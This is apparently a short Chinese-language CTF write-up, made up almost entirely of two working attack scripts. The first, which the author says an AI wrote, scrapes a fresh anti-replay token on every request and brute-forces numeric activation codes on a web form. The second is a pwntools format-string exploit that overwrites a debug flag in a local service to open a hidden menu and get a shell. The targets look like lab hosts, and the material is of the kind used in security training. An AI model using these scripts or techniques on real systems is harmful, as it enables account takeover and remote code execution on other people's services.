注册完用户，需要激活，但是一个token只能请求一次，发现是每次 GET 都会在一个隐藏标签返回token，那就让ai写个脚本爆破一下 

```python
import re
import sys
import time
import requests

BASE = "http://token.dsz"
USER_ID = 18

sess = requests.Session()
sess.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept-Language": "zh-CN,zh;q=0.9",
})

def get_token():
    url = f"{BASE}/activate.php?id={USER_ID}"
    r = sess.get(url, timeout=10)
    r.raise_for_status()

    m = re.search(r'name="token"\s+value="([a-fA-F0-9]{32})"', r.text)
    if not m:
        print("[!] 没抓到 token，返回前 1000 字符如下：")
        print(r.text[:1000])
        return None

    return m.group(1)

def try_code(code):
    token = get_token()
    if not token:
        return False, "no_token", None

    data = {
        "id": str(USER_ID),
        "token": token,
        "code": code,
        "activate": ""
    }

    headers = {
        "Origin": BASE,
        "Referer": f"{BASE}/activate.php?id={USER_ID}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    r = sess.post(
        f"{BASE}/activate.php?id={USER_ID}",
        data=data,
        headers=headers,
        timeout=10,
        allow_redirects=True
    )
    r.raise_for_status()
    text = r.text

    if "Token 错误，请刷新页面重试" in text:
        return False, "bad_token", token

    # 这里的“验证码错误”文案你可以再按真实页面补充
    if "激活码错误" in text or "验证码错误" in text or "无效激活码" in text:
        return False, "bad_code", token

    # 命中后的常见特征，可自行补充
    if "激活成功" in text or "success" in text.lower() or "欢迎" in text:
        return True, "success", token

    # 没匹配到已知错误，通常值得重点看
    return True, "interesting", token

def main():
    for i in range(1000):
        code = f"{i:06}"
        try:
            ok, status, token = try_code(code)
            print(f"[*] code={code} status={status} token={token}")

            if ok:
                print(f"[+] 可能命中，code = {code}")
                # 再抓一次展示最后页面，或直接退出
                break


        except KeyboardInterrupt:
            print("\n[!] 用户中断")
            sys.exit(0)
        except Exception as e:
            print(f"[!] code={code} 出错: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
```

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

HOST = '127.0.0.1'
PORT = 1314
DEBUG_MODE = 0x403d74

io = remote(HOST, PORT)

def menu(n):
    io.recvuntil('请选择 [1-5]: '.encode())
    io.sendline(str(n).encode())

# 1. 进入格式化字符串功能
menu(2)
io.recvuntil('心情: '.encode())

# 2. 写 debug_mode = 4
payload = b'AAAA%8$n' + p64(DEBUG_MODE)
print(f'payload len = {len(payload)}')
print(payload)

io.sendline(payload)

# 3. 把当前功能的输出全部读完，直到菜单回来
out = io.recvuntil('请选择 [1-5]: '.encode())
print(out.decode('utf-8', errors='ignore'))

# 4. 触发隐藏功能
io.sendline(b'666')

# 5. 读出调试提示
dbg = io.recvuntil(b': ')
print(dbg.decode('utf-8', errors='ignore'))

# 6. 拿 shell
io.sendline(b'shell')

io.interactive()
```
